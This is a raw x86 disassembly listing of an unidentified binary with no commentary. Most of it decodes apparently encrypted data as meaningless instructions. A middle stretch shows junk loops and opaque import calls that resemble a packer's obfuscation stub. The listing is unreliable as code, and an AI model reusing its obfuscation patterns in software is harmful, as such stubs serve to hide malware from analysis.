  416317:	mov    edi,0x51a0f547
  41631c:	mov    dh,0x31
  41631e:	add    BYTE PTR [edi+eiz*2+0x4fa50c82],ch
  416325:	adc    al,BYTE PTR [eax-0x39a69930]
  41632b:	call   0xd4097ee6
  416330:	outs   dx,DWORD PTR ds:[esi]
  416331:	retf   
  416332:	stos   DWORD PTR es:[edi],eax
  416333:	lods   eax,DWORD PTR ds:[esi]
  416334:	and    al,0x61
  416336:	jmp    0x4162d9
  416338:	xchg   ecx,eax
  416339:	ins    DWORD PTR es:[edi],dx
  41633a:	dec    ebx
  41633b:	jp     0x4162f1
  41633d:	and    eax,0x8bb0d62b
  416342:	and    DWORD PTR [eax],ecx
  416344:	push   cs
  416345:	cs adc dl,al
  416348:	jnp    0x4163bc
  41634a:	(bad)  
  41634b:	and    esp,DWORD PTR [ebp-0x1a3d32ae]
  416351:	mov    edi,0x3526bb96
  416356:	mov    edi,0x338b6a0f
  41635b:	pop    esp
  41635c:	fs iret 
  41635e:	in     al,dx
  41635f:	push   eax
  416360:	in     eax,dx
  416361:	lahf   
  416362:	repz xchg ebp,eax
  416364:	test   al,0x6d
  416366:	inc    ebp
  416367:	sbb    eax,0x3f6aa068
  41636c:	loope  0x41637f
  41636e:	mov    dl,0x2a
  416370:	xor    BYTE PTR [edi-0x1430be7b],ch
  416376:	int    0xc0
  416378:	cmc    
  416379:	popf   
  41637a:	retf   0xc35a
  41637d:	mov    eax,ss
  41637f:	xor    al,0x73
  416381:	mov    edx,0x23ffc5c8
  416386:	lods   eax,DWORD PTR ds:[esi]
  416387:	std    
  416388:	mov    ecx,0xbe7aac53
  41638d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41638e:	cmp    ebx,DWORD PTR [esi]
  416390:	mov    cl,0x6b
  416392:	in     eax,0xdb
  416394:	push   0x979fa54b
  416399:	retf   0xdc53
  41639c:	push   ebp
  41639d:	fcomp  DWORD PTR [edi+0x6f]
  4163a0:	ret    
  4163a1:	cmp    al,0xfe
  4163a3:	ins    BYTE PTR es:[edi],dx
  4163a4:	cdq    
  4163a5:	rcl    BYTE PTR [edx],1
  4163a7:	cwde   
  4163a8:	mov    esi,cs
  4163aa:	sub    eax,0xab4edb1f
  4163af:	jg     0x4163a6
  4163b1:	push   eax
  4163b2:	dec    ebx
  4163b3:	test   al,0xc
  4163b5:	outs   dx,BYTE PTR ds:[esi]
  4163b6:	popa   
  4163b7:	and    DWORD PTR [eax-0x42e10a6e],ebp
  4163bd:	fsub   DWORD PTR [eax]
  4163bf:	jge    0x416349
  4163c1:	pavgb  mm4,QWORD PTR [ebx+0x53]
  4163c5:	and    edi,DWORD PTR [edx+edi*4-0x71c36fd9]
  4163cc:	mov    al,ds:0xa636283f
  4163d1:	sub    DWORD PTR [ebp+esi*4-0x1001c746],ebx
  4163d8:	daa    
  4163d9:	cmp    BYTE PTR [ebp-0x7d5a67d8],0xb9
  4163e0:	jb     0x4163e3
  4163e2:	xchg   edi,eax
  4163e3:	or     BYTE PTR [edx-0x3617893e],dh
  4163e9:	loop   0x416454
  4163eb:	push   ss
  4163ec:	pop    ebx
  4163ed:	(bad)  [esi+ebp*2+0x1638331b]
  4163f4:	mov    dh,0x1e
  4163f6:	mov    al,0x43
  4163f8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4163f9:	mov    ds:0x8952486e,al
  4163fe:	push   es
  4163ff:	inc    edi
  416400:	aaa    
  416401:	ss or  al,0xab
  416404:	push   ebp
  416405:	adc    bh,BYTE PTR [ecx-0x5a871f9]
  41640b:	dec    esi
  41640c:	mov    ch,0xf5
  41640e:	lds    ebx,FWORD PTR [ebx+ecx*4+0x5b]
  416412:	fld    TBYTE PTR ds:0x45fc57cc
  416418:	xor    al,0x69
  41641a:	adc    eax,0xdb3b94db
  41641f:	dec    ecx
  416420:	adc    edi,DWORD PTR [edx+0x6a8cbd79]
  416426:	into   
  416427:	mov    cl,0xb3
  416429:	mov    esi,0xd8fc441
  41642e:	adc    BYTE PTR [ecx],ah
  416430:	push   cs
  416431:	cmp    eax,0x367544b7
  416436:	sub    eax,0x1512474b
  41643b:	loop   0x416403
  41643d:	xchg   edx,eax
  41643e:	mov    eax,ds:0xc5768250
  416443:	xor    BYTE PTR [ebp-0x685e5a6c],bh
  416449:	cmc    
  41644a:	outs   dx,DWORD PTR ds:[esi]
  41644b:	je     0x4163fe
  41644d:	jns    0x416458
  41644f:	loope  0x4164ad
  416451:	in     al,0x43
  416453:	test   DWORD PTR [eax+0x7d],edi
  416456:	cmp    eax,0x39d39bb8
  41645b:	or     ah,BYTE PTR [esi+ecx*4+0x1d76ded2]
  416462:	add    al,BYTE PTR [ebp+eax*4+0x6a16b20f]
  416469:	(bad)  
  41646b:	add    DWORD PTR [ebx],esi
  41646d:	retf   
  41646e:	jo     0x416480
  416470:	push   ds
  416471:	mov    edx,0xefb3274c
  416476:	jae    0x41642d
  416478:	mov    ds:0x613fa9cb,al
  41647d:	mov    al,dh
  41647f:	cmc    
  416480:	xchg   esp,eax
  416481:	cwde   
  416482:	xchg   ecx,eax
  416483:	push   ecx
  416484:	push   edi
  416485:	jge    0x416505
  416487:	out    dx,eax
  416488:	aad    0x8a
  41648a:	pop    esp
  41648b:	sub    ah,BYTE PTR [edx-0x6c6a3342]
  416491:	mov    ch,BYTE PTR [edi-0x59]
  416494:	sbb    DWORD PTR [ecx-0x40],0xf981a0e7
  41649b:	sbb    eax,0xe798fcd2
  4164a0:	jbe    0x416471
  4164a2:	mov    al,ds:0x38a31040
  4164a7:	mov    ah,0x57
  4164a9:	ss push 0x56
  4164ac:	mov    bh,0xf9
  4164ae:	test   DWORD PTR [edx],0x4632c4be
  4164b4:	sub    edi,ebx
  4164b6:	addr16 jns 0x4164e1
  4164b9:	into   
  4164ba:	cdq    
  4164bb:	pushf  
  4164bc:	in     al,0xd2
  4164be:	int    0x16
  4164c0:	pop    esp
  4164c1:	xchg   esi,eax
  4164c2:	sub    al,0x22
  4164c4:	fld    TBYTE PTR [esi+eax*1-0x50]
  4164c8:	or     ebx,DWORD PTR [eax]
  4164ca:	hlt    
  4164cb:	popa   
  4164cc:	mov    edx,0xd70fd243
  4164d1:	in     eax,dx
  4164d2:	cli    
  4164d3:	or     eax,0xe12e91a7
  4164d8:	xchg   ebp,edi
  4164da:	int3   
  4164db:	pop    ebp
  4164dc:	call   0xc32d7da3
  4164e1:	jbe    0x416542
  4164e3:	add    dl,bh
  4164e5:	jno    0x4164fe
  4164e7:	pusha  
  4164e8:	mov    ebx,0x9d4418e2
  4164ed:	pop    ds
  4164ee:	fmul   QWORD PTR [eax+0x3d]
  4164f1:	push   0x979d66ed
  4164f6:	push   es
  4164f7:	int    0x8d
  4164f9:	js     0x4164f5
  4164fb:	inc    eax
  4164fc:	int    0x35
  4164fe:	lods   eax,DWORD PTR ds:[esi]
  4164ff:	xor    al,0x67
  416501:	jo     0x4164b8
  416503:	mov    ah,0x2d
  416505:	xlat   BYTE PTR ds:[ebx]
  416506:	xchg   esi,eax
  416507:	shl    DWORD PTR [edi-0x69],0x6a
  41650b:	and    DWORD PTR [ecx],ebp
  41650d:	leave  
  41650e:	jno    0x41655e
  416510:	sub    DWORD PTR [edx+0xddc7f4d],edi
  416516:	or     ah,bh
  416518:	loop   0x416516
  41651a:	pop    es
  41651b:	imul   edx,DWORD PTR [esi],0xde54b0ff
  416521:	ret    
  416522:	mov    ds:0x21c03711,al
  416527:	or     bh,bh
  416529:	fsub   QWORD PTR [ecx-0x2f]
  41652c:	cmp    al,0x3f
  41652e:	pushf  
  41652f:	repnz mov esp,0xd97cff53
  416535:	or     BYTE PTR [ecx+0x6eb15939],0xb4
  41653c:	jge    0x4165bb
  41653e:	fcom   DWORD PTR [ecx+0x76]
  416541:	lahf   
  416542:	pusha  
  416543:	movzx  ecx,WORD PTR [ecx+edx*4]
  416547:	xor    DWORD PTR ds:0x432ea7,0x432e77
  416551:	xor    ecx,0x8a9b
  416557:	mov    DWORD PTR ds:0x432ea3,0x5f74
  416561:	add    ecx,edi
  416563:	mov    edi,DWORD PTR [ebp-0xc]
  416566:	mov    DWORD PTR ds:0x432e73,0x23ca
  416570:	mov    BYTE PTR [ebp+edi*1-0x9c],cl
  416577:	inc    edx
  416578:	mov    ecx,DWORD PTR [ebp-0x10]
  41657b:	mov    DWORD PTR ds:0x432e37,0x4a6a
  416585:	cmp    edx,ecx
  416587:	mov    DWORD PTR ds:0x432e73,0x3902
  416591:	jne    0x414140
  416597:	mov    ecx,DWORD PTR [ebp-0x18]
  41659a:	mov    DWORD PTR ds:0x432ebf,0x19
  4165a4:	cmp    DWORD PTR ds:0x432ebf,0x0
  4165ab:	je     0x4165e3
  4165b1:	cmp    DWORD PTR ds:0x432ebf,0x1d
  4165b8:	jle    0x4165e3
  4165be:	jmp    0x4165d1
  4165c3:	push   DWORD PTR [ebp-0x14]
  4165c6:	push   0x8b92
  4165cb:	call   DWORD PTR ds:0x43fdf3
  4165d1:	mov    edx,DWORD PTR ds:0x432ebf
  4165d7:	dec    edx
  4165d8:	mov    DWORD PTR ds:0x432ebf,edx
  4165de:	jmp    0x4165a4
  4165e3:	mov    edx,DWORD PTR [ebp+0x10]
  4165e6:	and    DWORD PTR ds:0x432e83,0x0
  4165f0:	mov    edi,DWORD PTR ds:0x432e83
  4165f6:	inc    edi
  4165f7:	mov    DWORD PTR ds:0x432e83,edi
  4165fd:	cmp    DWORD PTR ds:0x432e83,0x2c
  416604:	jg     0x416627
  41660a:	jmp    0x41661a
  41660f:	push   0x432e8f
  416614:	call   DWORD PTR ds:0x43fdf7
  41661a:	cmp    DWORD PTR ds:0x432e83,0x1e
  416621:	jb     0x4165f0
  416627:	xor    ecx,eax
  416629:	add    DWORD PTR ds:0x432e97,edx
  41662f:	add    ecx,esi
  416631:	xor    DWORD PTR ds:0x432e57,edx
  416637:	mov    DWORD PTR [edx],ecx
  416639:	sbb    edi,ecx
  41663b:	mov    ecx,DWORD PTR [ebp-0x18]
  41663e:	xor    DWORD PTR ds:0x432ec7,ebx
  416644:	xor    ecx,eax
  416646:	add    ecx,esi
  416648:	mov    DWORD PTR ds:0x432ebb,0x1e
  416652:	cmp    DWORD PTR ds:0x432ebb,0x0
  416659:	je     0x4166a8
  41665f:	cmp    DWORD PTR ds:0x432ebb,0x2
  416666:	jbe    0x4166a8
  41666c:	jmp    0x41667c
  416671:	push   0x71f6
  416676:	call   DWORD PTR ds:0x43fdfb
  41667c:	cmp    DWORD PTR ds:0x432ebb,0x3
  416683:	jne    0x416696
  416689:	mov    edi,DWORD PTR ds:0x432ebb
  41668f:	dec    edi
  416690:	mov    DWORD PTR ds:0x432ebb,edi
  416696:	mov    edi,DWORD PTR ds:0x432ebb
  41669c:	dec    edi
  41669d:	mov    DWORD PTR ds:0x432ebb,edi
  4166a3:	jmp    0x416652
  4166a8:	mov    DWORD PTR [ebp-0xc],ecx
  4166ab:	sbb    DWORD PTR ds:0x432eab,0x39c1
  4166b5:	mov    DWORD PTR [ebp+0x8],0xf89c85a5
  4166bc:	mov    DWORD PTR [ebp-0x14],0xf89c85b5
  4166c3:	sbb    edi,ecx
  4166c5:	mov    DWORD PTR [ebp-0x10],0xf89c95a5
  4166cc:	mov    DWORD PTR ds:0x432e6f,0x17
  4166d6:	cmp    DWORD PTR ds:0x432e6f,0x0
  4166dd:	je     0x41671c
  4166e3:	cmp    DWORD PTR ds:0x432e6f,0x23
  4166ea:	jl     0x41671c
  4166f0:	jmp    0x41670a
  4166f5:	push   0x4cf4
  4166fa:	push   0x432e23
  4166ff:	push   0x15e1
  416704:	call   DWORD PTR ds:0x43fdff
  41670a:	mov    edi,DWORD PTR ds:0x432e6f
  416710:	dec    edi
  416711:	mov    DWORD PTR ds:0x432e6f,edi
  416717:	jmp    0x4166d6
  41671c:	mov    ecx,DWORD PTR [ebp-0x14]
  41671f:	add    edi,DWORD PTR ds:0x432e3f
  416725:	mov    DWORD PTR [ebp+0x8],ecx
  416728:	sub    edi,0x632b
  41672e:	mov    ecx,DWORD PTR [ebp+0x8]
  416731:	xor    DWORD PTR ds:0x432e53,edi
  416737:	xor    ecx,eax
  416739:	mov    edi,DWORD PTR ds:0x432e9b
  41673f:	adc    DWORD PTR ds:0x432ebb,edi
  416745:	add    ecx,esi
  416747:	mov    edi,DWORD PTR ds:0x432e43
  41674d:	mov    ecx,0x242ebf1
  416752:	mov    edi,0xf641bf2
  416757:	mov    DWORD PTR ds:0x432e77,0x250d
  416761:	je     0x4191f8
  416767:	mov    edx,DWORD PTR [ebp+0x8]
  41676a:	mov    ebx,DWORD PTR [ebp-0x8]
  41676d:	neg    DWORD PTR ds:0x432e8f
  416773:	xor    edx,eax
  416775:	xor    ebx,eax
  416777:	sub    edx,ebx
  416779:	xor    DWORD PTR ds:0x432e63,edx
  41677f:	sub    edx,esi
  416781:	add    DWORD PTR ds:0x432eaf,0x644f
  41678b:	xor    edx,eax
  41678d:	or     DWORD PTR ds:0x432e27,0x4378
  416797:	mov    DWORD PTR [ebp+0x8],edx
  41679a:	and    DWORD PTR ds:0x432e67,0x0
  4167a4:	mov    edx,DWORD PTR ds:0x432e67
  4167aa:	inc    edx
  4167ab:	mov    DWORD PTR ds:0x432e67,edx
  4167b1:	cmp    DWORD PTR ds:0x432e67,0xe
  4167b8:	jl     0x4167f7
  4167be:	jmp    0x4167ce
  4167c3:	push   0x432111
  4167c8:	call   DWORD PTR ds:0x43fdcb
  4167ce:	cmp    DWORD PTR ds:0x432e67,0xd
  4167d5:	jne    0x4167ea
  4167db:	xor    edx,edx
  4167dd:	xor    edx,DWORD PTR ds:0x432e67
  4167e3:	inc    edx
  4167e4:	mov    DWORD PTR ds:0x432e67,edx
  4167ea:	cmp    DWORD PTR ds:0x432e67,0x1e
  4167f1:	jb     0x4167a4
  4167f7:	mov    edx,DWORD PTR [ebp+0x8]
  4167fa:	mov    ebx,DWORD PTR [ebp-0x58]
  4167fd:	adc    DWORD PTR ds:0x432eaf,0x432e9b
  416807:	add    edx,0x5708e4
  41680d:	imul   edx,ebx
  416810:	mov    ebx,DWORD PTR ds:0x432e87
  416816:	or     DWORD PTR ds:0x432e57,ebx
  41681c:	mov    DWORD PTR [ebp-0x58],edx
  41681f:	mov    edx,DWORD PTR ds:0x43707f
  416825:	mov    ebx,DWORD PTR ds:0x4392ff
  41682b:	sub    ebx,edx
  41682d:	xor    edx,DWORD PTR [edx+ebx*1]
  416830:	mov    edx,DWORD PTR [ebp+0x8]
  416833:	mov    ebx,DWORD PTR [ebp-0x54]
  416836:	xor    DWORD PTR ds:0x432e5b,0x432e83
  416840:	add    edx,0x64f882
  416846:	and    DWORD PTR ds:0x432eab,0x41a4
  416850:	or     edx,ebx
  416852:	and    DWORD PTR ds:0x432e53,0x0
  41685c:	mov    ebx,DWORD PTR ds:0x432e53
  416862:	inc    ebx
  416863:	mov    DWORD PTR ds:0x432e53,ebx
  416869:	cmp    DWORD PTR ds:0x432e53,0x1d
  416870:	ja     0x416893
  416876:	jmp    0x416886
  41687b:	push   0x43215b
  416880:	call   DWORD PTR ds:0x43fdcf
  416886:	cmp    DWORD PTR ds:0x432e53,0x11
  41688d:	jb     0x41685c
  416893:	mov    DWORD PTR [ebp-0x54],edx
  416896:	mov    DWORD PTR ds:0x432e83,0x1e
  4168a0:	cmp    DWORD PTR ds:0x432e83,0x0
  4168a7:	je     0x4168f8
  4168ad:	cmp    DWORD PTR ds:0x432e83,0xe
  4168b4:	jb     0x4168f8
  4168ba:	jmp    0x4168ca
  4168bf:	push   0x8096
  4168c4:	call   DWORD PTR ds:0x43fdd3
  4168ca:	cmp    DWORD PTR ds:0x432e83,0xf
  4168d1:	jne    0x4168e6
  4168d7:	xor    edx,edx
  4168d9:	add    edx,DWORD PTR ds:0x432e83
  4168df:	dec    edx
  4168e0:	mov    DWORD PTR ds:0x432e83,edx
  4168e6:	mov    edx,DWORD PTR ds:0x432e83
  4168ec:	dec    edx
  4168ed:	mov    DWORD PTR ds:0x432e83,edx
  4168f3:	jmp    0x4168a0
  4168f8:	mov    edx,DWORD PTR [ebp+0x8]
  4168fb:	mov    ebx,DWORD PTR [ebp-0x50]
  4168fe:	sub    DWORD PTR ds:0x432e8b,0x432e67
  416908:	add    edx,ecx
  41690a:	xor    edx,ebx
  41690c:	xor    DWORD PTR ds:0x432e73,0x75fe
  416916:	mov    DWORD PTR [ebp-0x50],edx
  416919:	sbb    DWORD PTR ds:0x432eaf,0x1c33
  416923:	mov    edx,DWORD PTR [ebp+0x8]
  416926:	adc    DWORD PTR ds:0x432e4b,edx
  41692c:	mov    ebx,DWORD PTR [ebp-0x4c]
  41692f:	sbb    DWORD PTR ds:0x432e73,0x359
  416939:	add    edx,edi
  41693b:	add    DWORD PTR ds:0x432e33,0x432e43
  416945:	and    edx,ebx
  416947:	movzx  ebx,WORD PTR ds:0x432e3b
  41694e:	xor    DWORD PTR ds:0x432eb7,ebx
  416954:	mov    DWORD PTR [ebp-0x4c],edx
  416957:	add    ebx,DWORD PTR ds:0x432ebf
  41695d:	mov    edx,DWORD PTR [ebp+0x8]
  416960:	or     ebx,DWORD PTR ds:0x432e33
  416966:	mov    ebx,DWORD PTR [ebp-0x48]
  416969:	lea    edx,[ebx+edx*1+0x241fcdf]
  416970:	xor    DWORD PTR ds:0x432eab,0x519b
  41697a:	mov    DWORD PTR [ebp-0x48],edx
  41697d:	mov    edx,DWORD PTR [ebp+0x8]
  416980:	and    DWORD PTR ds:0x432eab,0x0
  41698a:	jmp    0x41699e
  41698f:	xor    ebx,ebx
  416991:	or     ebx,DWORD PTR ds:0x432eab
  416997:	inc    ebx
  416998:	mov    DWORD PTR ds:0x432eab,ebx
  41699e:	cmp    DWORD PTR ds:0x432eab,0x1b
  4169a5:	jae    0x4169e7
  4169ab:	cmp    DWORD PTR ds:0x432eab,0xb
  4169b2:	jbe    0x4169e7
  4169b8:	jmp    0x4169c8
  4169bd:	push   0x43215b
  4169c2:	call   DWORD PTR ds:0x43fddb
  4169c8:	cmp    DWORD PTR ds:0x432eab,0xa
  4169cf:	jne    0x4169e2
  4169d5:	mov    ebx,DWORD PTR ds:0x432eab
  4169db:	inc    ebx
  4169dc:	mov    DWORD PTR ds:0x432eab,ebx
  4169e2:	jmp    0x41698f
  4169e7:	mov    ebx,0xfa5e1522
  4169ec:	or     DWORD PTR ds:0x432e7b,0x3b15
  4169f6:	sub    ebx,edx
  4169f8:	add    ebx,DWORD PTR [ebp-0x44]
  4169fb:	mov    DWORD PTR [ebp-0x44],ebx
  4169fe:	mov    edx,DWORD PTR ds:0x432e8f
  416a04:	xor    edx,DWORD PTR ds:0x432e27
  416a0a:	mov    DWORD PTR ds:0x432e8f,edx
  416a10:	mov    edx,DWORD PTR [ebp+0x8]
  416a13:	xor    edx,eax
  416a15:	add    edx,esi
  416a17:	jne    0x416767
  416a1d:	mov    DWORD PTR ds:0x432ea3,0x25d2
  416a27:	jmp    0x4191f8
  416a2c:	mov    edx,DWORD PTR [ebp-0xc]
  416a2f:	xor    ebx,ebx
  416a31:	or     ebx,DWORD PTR ds:0x432ea3
  416a37:	xor    ebx,DWORD PTR ds:0x432ea7
  416a3d:	mov    DWORD PTR ds:0x432ea3,ebx
  416a43:	sub    edx,esi
  416a45:	xor    edx,eax
  416a47:	sbb    ebx,DWORD PTR ds:0x432e87
  416a4d:	mov    DWORD PTR [ebp-0x5c],edx
  416a50:	jmp    0x418e09
  416a55:	out    0xe2,al
  416a57:	dec    edx
  416a58:	mov    dl,0x46
  416a5a:	stos   BYTE PTR es:[edi],al
  416a5b:	xchg   BYTE PTR [esi+0x2de23c83],dl
  416a61:	loop   0x416a77
  416a63:	je     0x416acd
  416a65:	stc    
  416a66:	inc    esp
  416a67:	add    BYTE PTR [ebx-0x7c7c9f19],0x9a
  416a6e:	jmp    0x8f45:0x53353b94
  416a75:	mov    edi,0x37394793
  416a7a:	adc    al,0x8f
  416a7c:	cld    
  416a7d:	daa    
  416a7e:	mov    dh,ah
  416a80:	or     al,0xa
  416a82:	adc    esp,DWORD PTR ds:0xfe59ac29
  416a88:	mov    dh,0x8c
  416a8a:	and    BYTE PTR [esi+ecx*4-0x21],dh
  416a8e:	pusha  
  416a8f:	mov    cl,0xaa
  416a91:	xor    ebx,0xc
  416a94:	aad    0x3
  416a96:	mov    ecx,0xd0e5d559
  416a9b:	in     eax,dx
  416a9c:	outs   dx,BYTE PTR ds:[esi]
  416a9d:	dec    edx
  416a9e:	pop    ecx
  416a9f:	jmp    0x416a4b
  416aa1:	in     eax,0x8e
  416aa3:	daa    
  416aa4:	jbe    0x416a53
  416aa6:	sbb    al,0x64
  416aa8:	cmp    edx,eax
  416aaa:	outs   dx,DWORD PTR ds:[esi]
  416aab:	jmp    0xcd55:0x39d54bc8
  416ab2:	sbb    BYTE PTR [ebp+0x72],ah
  416ab5:	mov    ebx,0xca2d6ec8
  416aba:	rol    BYTE PTR [ecx-0x39],cl
  416abd:	fistp  WORD PTR ds:0x9d2726dc
  416ac3:	pop    ebx
  416ac4:	dec    edx
  416ac5:	dec    edi
  416ac6:	push   cs
  416ac7:	mov    dh,0x9f
  416ac9:	sbb    eax,edi
  416acb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416acc:	shl    BYTE PTR [ebp+0x22e734e1],0x96
  416ad3:	outs   dx,DWORD PTR ds:[esi]
  416ad4:	ja     0x416a6b
  416ad6:	sbb    dh,dh
  416ad8:	or     dh,BYTE PTR [edx]
  416ada:	or     DWORD PTR [ebx],0xffffff8f
  416add:	push   0x1c6b5159
  416ae2:	int3   
  416ae3:	xchg   esp,eax
  416ae4:	jle    0x416b26
  416ae6:	stos   DWORD PTR es:[edi],eax
  416ae7:	(bad)  
  416ae8:	(bad)  
  416ae9:	adc    DWORD PTR [edx-0x78],edi
  416aec:	sub    esi,DWORD PTR [ecx]
  416aee:	enter  0x75e9,0xd3
  416af2:	cs leave 
  416af4:	arpl   WORD PTR [eax+0x50ef7112],si
  416afa:	iret   
  416afb:	iret   
  416afc:	jmp    0x416adb
  416afe:	xchg   DWORD PTR [ecx-0x22],ebx
  416b01:	out    dx,al
  416b02:	mov    edx,0x3f4b7193
  416b07:	mov    al,0x1e
  416b09:	je     0x416b54
  416b0b:	es xchg ebx,eax
  416b0d:	lea    eax,[edi]
  416b0f:	add    BYTE PTR [edi-0xc],0xd7
  416b13:	mov    dl,0xad
  416b15:	xchg   ebp,eax
  416b16:	out    dx,al
  416b17:	je     0x416aab
  416b19:	cs (bad) 
  416b1b:	push   ds
  416b1c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416b1d:	in     eax,0x88
  416b1f:	mov    edx,0x7ff637a0
  416b24:	xchg   ecx,eax
  416b25:	and    DWORD PTR [edi+0x8bb4775],esi
  416b2b:	jno    0x416b19
  416b2d:	pop    es
  416b2e:	or     eax,edx
  416b30:	pop    ss
  416b31:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416b32:	mov    DWORD PTR [ebp-0xdc15f17],0xb213a9af
  416b3c:	cmp    DWORD PTR [ebx],esp
  416b3e:	adc    BYTE PTR [eax+0x10f2039c],bh
  416b44:	fs and edx,0x2e18568a
  416b4b:	mov    al,0x3
  416b4d:	adc    al,0xcb
  416b4f:	inc    esp
  416b50:	ret    
  416b51:	arpl   WORD PTR [ecx-0x292ed15],dx
  416b57:	lds    edi,FWORD PTR [esi]
  416b59:	mov    al,0x18
  416b5b:	or     DWORD PTR [eax-0x79caa7f4],ebp
  416b61:	xchg   ecx,eax
  416b62:	in     eax,0xd4
  416b64:	push   edi
  416b65:	jo     0x416bb0
  416b67:	mul    DWORD PTR [edx-0x3c]
  416b6a:	xchg   esp,eax
  416b6b:	mov    bh,0xca
  416b6d:	fnstenv [edx-0x1a8a147f]
  416b73:	cmp    cl,BYTE PTR [edi+0xc]
  416b76:	mov    ah,0xf6
  416b78:	scas   eax,DWORD PTR es:[edi]
  416b79:	(bad)
  416b7c:	cvttps2pi mm2,QWORD PTR [ebp+0x15ece5b1]
  416b83:	pop    eax
  416b84:	and    ebp,esp
  416b86:	aaa    
  416b87:	mov    eax,0x7d3394a2
  416b8c:	hlt    
  416b8d:	xor    dh,BYTE PTR [edx]
  416b8f:	aas    
  416b90:	fisubr WORD PTR [edi+0x47]
  416b93:	in     al,dx
  416b94:	jne    0x416bae
  416b96:	lods   al,BYTE PTR ds:[esi]
  416b97:	push   edi
  416b98:	mov    DWORD PTR [esi+0x6f],0x12cc2cc8
  416b9f:	nop
  416ba0:	ret    0x8aa6
  416ba3:	push   eax
  416ba4:	test   al,0x38
  416ba6:	pop    eax
  416ba7:	retf   0x96b8
  416baa:	ds xchg esp,ebp
  416bad:	push   cs
  416bae:	or     al,0xa3
  416bb0:	pop    ecx
  416bb1:	push   ds
  416bb2:	fdiv   DWORD PTR [esi]
  416bb4:	pop    edx
  416bb5:	push   eax
  416bb6:	mov    ah,0x8f
  416bb8:	jmp    0x416ba4
  416bba:	sbb    BYTE PTR [edi+0x0],dl
  416bbd:	or     eax,DWORD PTR [ebp-0x2b]
  416bc0:	dec    ebx
  416bc1:	lea    edi,[edi+edi*8+0x9893a29]
  416bc8:	je     0x416b69
  416bca:	adc    DWORD PTR [ebx+edx*8+0x6874bf21],0xffffffdb
  416bd2:	sub    eax,0x5185e3b3
  416bd7:	jmp    0x9acfd90a
  416bdc:	inc    edx
  416bdd:	mov    ah,0x9
  416bdf:	cwde   
  416be0:	mov    DWORD PTR [ecx+eax*4],ebp
  416be3:	icebp  
  416be4:	pusha  
  416be5:	es in  eax,dx
  416be7:	jb     0x416bb6
  416be9:	pusha  
  416bea:	push   0x610982c0
  416bef:	outs   dx,DWORD PTR ds:[esi]
  416bf0:	aam    0x1e
  416bf2:	push   0x998f25dd
  416bf7:	sti    
  416bf8:	xchg   ebp,eax
  416bf9:	pop    edx
  416bfa:	pop    DWORD PTR ds:0x9ce7c080
  416c00:	push   ebx
  416c01:	push   ss
  416c02:	enter  0xb386,0xfc
  416c06:	jmp    0x4770703c
  416c0b:	jp     0x416c70
  416c0d:	imul   ebx,DWORD PTR [edx-0x64],0xd0d4e862
  416c14:	pop    esp
  416c15:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416c16:	in     al,dx
  416c17:	ss stc 
  416c19:	pop    ebp
  416c1a:	xchg   edx,eax
  416c1b:	pushf  
  416c1c:	add    dl,BYTE PTR [edx+0x49adfb68]
  416c22:	add    edx,esi
  416c24:	jns    0x416bcd
  416c26:	xor    ebx,DWORD PTR ds:0xd69f458a
  416c2c:	inc    edi
  416c2d:	int    0xc5
  416c2f:	xor    DWORD PTR [esi+0x26],edi
  416c32:	neg    BYTE PTR [esi+0x5f]
  416c35:	iret   
  416c36:	push   es
  416c37:	mov    eax,0x7e331dea
  416c3c:	mov    ds:0xb2355626,al
  416c41:	enter  0xe49c,0x70
  416c45:	outs   dx,DWORD PTR ds:[esi]
  416c46:	push   0x70
  416c48:	scas   al,BYTE PTR es:[edi]
  416c49:	add    bh,ah
  416c4b:	loope  0x416c23
  416c4d:	jp     0x416c2a
  416c4f:	fdivr  DWORD PTR [ebx-0x864106e]
  416c55:	and    ah,BYTE PTR [edx+0x56d37454]
  416c5b:	and    BYTE PTR [esi-0x4c],bh
  416c5e:	xchg   edi,eax
  416c5f:	(bad)
  416c63:	cmp    eax,0x8f57e8f
  416c68:	xchg   edi,eax
  416c69:	aad    0xb3
  416c6b:	mov    dl,0x5f
  416c6d:	cdq    
  416c6e:	test   al,0xf8
  416c70:	stc    
  416c71:	lods   al,BYTE PTR ds:[esi]
  416c72:	mov    eax,0x6ebd239b
  416c77:	mov    DWORD PTR [edi-0xce06068],0xdbe1c100
  416c81:	mov    ebp,0x8bfc8f0d
  416c86:	cld    
  416c87:	jno    0x416c10
  416c89:	xadd   DWORD PTR [esi+ebp*4+0x2936d3df],esi
  416c91:	or     esp,edx
  416c93:	mov    ah,0x9
  416c95:	jns    0x416cf9
  416c97:	dec    edi
  416c98:	js     0x416c20
  416c9a:	pop    ds
  416c9b:	pop    edx
  416c9c:	mov    edi,0xf2ddf532
  416ca1:	jne    0x416cbf
  416ca3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416ca4:	pop    ds
  416ca5:	scas   eax,DWORD PTR es:[edi]
  416ca6:	das    
  416ca7:	cmc    
  416ca8:	mov    ds:0x810b68fa,al
  416cad:	in     eax,0xa0
  416caf:	fldenv [edx+0x14212c4c]
  416cb5:	icebp  
  416cb6:	stos   DWORD PTR es:[edi],eax
  416cb7:	jmp    0x416cb9
  416cb9:	mov    ecx,0x19191964
  416cbe:	mov    ds:0xd68a1667,al
  416cc3:	mov    WORD PTR [edx-0x64b62ddb],fs
  416cc9:	and    bl,BYTE PTR [ebx-0x1d2fa500]
  416ccf:	sahf   
  416cd0:	sti    
  416cd1:	or     DWORD PTR [eax-0x56],eax
  416cd4:	sub    BYTE PTR [eax+0x67ecbfa4],dl
  416cda:	mov    bh,0xef
  416cdc:	clc    
  416cdd:	mov    esp,0xa7b41a70
  416ce2:	dec    ebx
  416ce3:	mov    dl,0xb
  416ce5:	push   0xffffffdc
  416ce7:	or     al,0x13
  416ce9:	scas   al,BYTE PTR es:[edi]
  416cea:	or     edx,edi
  416cec:	sbb    esi,DWORD PTR [ebp-0x7e4435a3]
  416cf2:	fcomi  st,st(3)
  416cf4:	jns    0x416d48
  416cf6:	push   cs
  416cf7:	mov    bh,0x88
  416cf9:	imul   ebp,DWORD PTR [ecx+0x5b],0x91a3d440
  416d00:	inc    ecx
  416d01:	cmp    esp,edi
  416d03:	sar    DWORD PTR [ebx],1
  416d05:	dec    esp
  416d06:	pushf  
